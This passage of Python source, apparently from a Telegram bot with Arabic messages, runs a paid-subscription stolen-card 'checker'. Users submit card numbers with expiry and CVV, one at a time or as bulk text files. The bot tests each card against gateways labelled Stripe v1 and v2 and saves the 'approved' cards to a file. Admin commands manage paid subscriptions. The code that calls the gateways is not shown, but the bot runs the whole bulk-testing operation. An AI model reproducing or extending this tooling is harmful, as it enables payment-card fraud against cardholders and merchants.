        bot.reply_to(message, f"🚪 <b>البوابات:</b>\n\n{gates}", parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_single(self, message, gate):
        if not self.check_sub(message): return
        parts = message.text.strip().split(' ', 1)
        if len(parts) < 2:
            bot.reply_to(message, f"⚠️ الاستخدام: /{GATES[gate]['command']} رقم|شهر|سنة|cvv\nمثال: /{GATES[gate]['command']} 4111111111111111|12|25|123")
            return
        
        card = Helpers.parse_card(parts[1])
        if not card:
            bot.reply_to(message, "❌ صيغة غير صحيحة")
            return
        
        if not Helpers.luhn_check(card['number']):
            bot.reply_to(message, "❌ البطاقة غير صالحة (Luhn check failed)")
            return
        
        msg = bot.reply_to(message, f"🔄 جاري الفحص عبر {GATES[gate]['icon']} {GATES[gate]['name']}...")
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
            loop.close()
            
            DataManager.update_usage(message.from_user.id, gate, resp)
            if approved: DataManager.save_approved_card(card['original'], GATES[gate]['name'], resp, message.from_user.id)
            
            bot.delete_message(msg.chat.id, msg.message_id)
            bot.reply_to(message, self.ui.format_result(card['original'], resp, GATES[gate]['name'], approved), parse_mode='HTML')
        except Exception as e:
            bot.edit_message_text(f"⚠️ خطأ: {str(e)[:50]}", msg.chat.id, msg.message_id)
    
    def handle_mass(self, message, gate):
        if not self.check_sub(message): return
        if not message.document:
            bot.reply_to(message, f"📁 أرسل ملف txt بالبطاقات\nاستخدم: /{GATES[gate]['mass_command']}")
            return
        
        try:
            file = bot.get_file(message.document.file_id)
            content = bot.download_file(file.file_path).decode('utf-8')
            cards = []
            for line in content.split('\n'):
                if line.strip():
                    c = Helpers.parse_card(line.strip())
                    if c and Helpers.luhn_check(c['number']):
                        cards.append(c)
            
            if not cards:
                bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
                return
            
            self.active_checks[message.message_id] = {
                'cards': cards, 'user_id': message.from_user.id, 'chat_id': message.chat.id, 
                'message_id': message.message_id, 'gate': gate
            }
            self.live_stats[message.from_user.id] = {'total': len(cards), 'checked': 0, 'approved': 0, 'declined': 0}
            
            asyncio.run_coroutine_threadsafe(self.process_mass_async(message.message_id, gate), asyncio.new_event_loop())
            
        except Exception as e:
            bot.reply_to(message, f"⚠️ {str(e)[:50]}")
    
    async def process_mass_async(self, check_id, gate):
        data = self.active_checks.get(check_id)
        if not data:
            return
        
        cards = data['cards']
        uid, cid = data['user_id'], data['chat_id']
        
        stats = self.live_stats[uid]
        stats_msg = await asyncio.get_event_loop().run_in_executor(
            None, 
            lambda: bot.send_message(cid, f"🔄 بدء الفحص عبر {GATES[gate]['icon']}\n{Helpers.format_live_stats(len(cards),0,0,0)}", 
                                    parse_mode='HTML', reply_markup=self.ui.stop_button(check_id))
        )
        
        for i, card in enumerate(cards, 1):
            if data.get('stop'):
                await asyncio.get_event_loop().run_in_executor(None, lambda: bot.edit_message_text(
                    f"⛔ تم الإيقاف\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'])}",
                    stats_msg.chat.id, stats_msg.message_id, parse_mode='HTML'
                ))
                break
            
            try:
                stats['current'] = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
                await asyncio.get_event_loop().run_in_executor(None, lambda: bot.edit_message_text(
                    f"🔄 {GATES[gate]['icon']}\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'], stats['current'])}",
                    stats_msg.chat.id, stats_msg.message_id, parse_mode='HTML', reply_markup=self.ui.stop_button(check_id)
                ))
                
                approved, resp = await self.gateways.check_card(gate, card)
                stats['checked'] += 1
                if approved:
                    stats['approved'] += 1
                    DataManager.save_approved_card(card['original'], GATES[gate]['name'], resp, uid)
                else:
                    stats['declined'] += 1
                
                DataManager.update_usage(uid, gate, resp)
                await asyncio.get_event_loop().run_in_executor(None, lambda: bot.send_message(cid, self.ui.format_result(card['original'], resp, GATES[gate]['name'], approved), parse_mode='HTML'))
                await asyncio.sleep(2)
            except Exception as e:
                stats['checked'] += 1
                stats['declined'] += 1
        
        await asyncio.get_event_loop().run_in_executor(None, lambda: bot.edit_message_text(
            f"✅ اكتمل\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'])}",
            stats_msg.chat.id, stats_msg.message_id, parse_mode='HTML'
        ))
        del self.active_checks[check_id]
        del self.live_stats[uid]
    
    def stop_check(self, call, check_id):
        if check_id in self.active_checks:
            self.active_checks[check_id]['stop'] = True
            bot.answer_callback_query(call.id, "⛔ جاري الإيقاف")
    
    def add_sub(self, message):
        if message.from_user.id not in ADMIN_IDS: return
        try:
            uid, days = map(int, message.text.strip().split())
            if DataManager.add_subscription(uid, days):
                bot.reply_to(message, f"✅ تمت إضافة اشتراك {days} يوم للمستخدم {uid}")
            else:
                bot.reply_to(message, "❌ فشل")
        except:
            bot.reply_to(message, "❌ الصيغة: ايدي المدة")
    
    def remove_sub(self, message):
        if message.from_user.id not in ADMIN_IDS: return
        try:
            uid = int(message.text.strip())
            if DataManager.remove_subscription(uid):
                bot.reply_to(message, f"✅ تم إزالة اشتراك {uid}")
            else:
                bot.reply_to(message, "❌ فشل")
        except:
            bot.reply_to(message, "❌ الصيغة: ايدي")

# ==================== معالج الكول باك ====================
class CallbackHandler:
    def __init__(self, handler):
        self.handler = handler
    
    def handle(self, call):
        data = call.data
        uid = call.from_user.id
        
        if data == "back_main":
            bot.edit_message_text("✨ القائمة الرئيسية", call.message.chat.id, call.message.message_id,
                                 reply_markup=UserInterface.main_menu(), parse_mode='HTML')
        elif data == "my_profile":
            self.handler.handle_profile(call.message)
        elif data == "stats":
            self.handler.handle_stats(call.message)
        elif data == "subscribe":
            sub = DataManager.get_user_subscription(uid)
            if sub:
                bot.edit_message_text(f"💎 اشتراكك نشط حتى {sub.get('expiry','')[:10]}", call.message.chat.id, call.message.message_id,
                                      reply_markup=UserInterface.back_button())
            else:
                plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
                bot.edit_message_text(f"💎 <b>خطط الاشتراك</b>\n{plans}\n\nللاشتراك: {DEV_CONTACT}", 
                                      call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=UserInterface.back_button())
        elif data.startswith("gate_"):
            gate = data.replace("gate_", "")
            bot.edit_message_text(f"✅ {GATES[gate]['icon']} {GATES[gate]['name']}\nأرسل: <code>/{GATES[gate]['command']} رقم|شهر|سنة|cvv</code>",
                                  call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=UserInterface.back_button("gates_menu"))
        elif data.startswith("mass_"):
            gate = data.replace("mass_", "")
            bot.edit_message_text(f"✅ {GATES[gate]['icon']} {GATES[gate]['name']}\nأرسل ملف txt بالبطاقات",
                                  call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=UserInterface.back_button("gates_menu"))
        elif data.startswith("stop_"):
            cid = int(data.replace("stop_", ""))
            self.handler.stop_check(call, cid)

# ==================== إعداد البوت ====================
def setup():
    for f in [USERS_FILE, APPROVED_CARDS_FILE, STATS_FILE]:
        if not os.path.exists(f):
            with open(f, 'w') as ff:
                if f.endswith('.json'): json.dump({} if f!=STATS_FILE else {"total_checks":0}, ff)
                else: ff.write("# Approved Cards\n")
    
    handler = CommandHandler()
    callback = CallbackHandler(handler)
    
    @bot.message_handler(commands=['start'])
    def start(m): handler.handle_start(m)
    
    @bot.message_handler(commands=['help'])
    def help(m): handler.handle_help(m)
    
    @bot.message_handler(commands=['profile'])
    def profile(m): handler.handle_profile(m)
    
    @bot.message_handler(commands=['stats'])
    def stats(m): handler.handle_stats(m)
    
    @bot.message_handler(commands=['subscribe'])
    def sub(m): handler.handle_subscribe(m)
    
    @bot.message_handler(commands=['gates'])
    def gates(m): handler.handle_gates(m)
    
    # Stripe v1 commands
    @bot.message_handler(commands=['st1'])
    def stripe1(m): handler.handle_single(m, 'stripe1')
    
    @bot.message_handler(commands=['st1m'])
    def stripe1_mass(m): handler.handle_mass(m, 'stripe1')
    
    # Stripe v2 commands
    @bot.message_handler(commands=['st2'])
    def stripe2(m): handler.handle_single(m, 'stripe2')
    
    @bot.message_handler(commands=['st2m'])
    def stripe2_mass(m): handler.handle_mass(m, 'stripe2')
    
    @bot.message_handler(commands=['admin'])
    def admin(m):
        if m.from_user.id in ADMIN_IDS:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("➕ إضافة اشتراك", callback_data="admin_add"),
                      InlineKeyboardButton("➖ إزالة اشتراك", callback_data="admin_remove"))
            bot.reply_to(m, "👑 قائمة المشرفين", reply_markup=markup)
    
    @bot.message_handler(content_types=['document'])
    def doc(m):
        # Check if there's a pending mass check
        handler.handle_mass(m, 'stripe1')
    
    @bot.message_handler(func=lambda m: True)
    def text(m):
        if '|' in m.text:
            handler.handle_single(m, 'stripe1')
        else:
            bot.reply_to(m, "⚠️ أمر غير معروف\nاستخدم /start للقائمة الرئيسية")
    
    @bot.callback_query_handler(func=lambda c: True)
    def cb(c): callback.handle(c)
    
    # Health check server
    def run_health():
        port = int(os.environ.get('PORT', 10000))
        with socketserver.TCPServer(("0.0.0.0", port), http.server.SimpleHTTPRequestHandler) as httpd:
            print(f"🌐 Health check on {port}")
            httpd.serve_forever()
    
    threading.Thread(target=run_health, daemon=True).start()
    
    print(Fore.GREEN + "🚀 البوت يعمل..." + Style.RESET_ALL)
    print(Fore.CYAN + f"📌 البوابات:" + Style.RESET_ALL)
    print(Fore.YELLOW + "   💳 Stripe v1: /st1 (فردي) | /st1m (ملف)" + Style.RESET_ALL)
    print(Fore.YELLOW + "   💎 Stripe v2: /st2 (فردي) | /st2m (ملف)" + Style.RESET_ALL)
    bot.infinity_polling()

# ==================== التشغيل ====================
if __name__ == "__main__":
    try:
        setup()
    except KeyboardInterrupt:
        print("\n⚠️ تم الإيقاف")
        sys.exit(0)
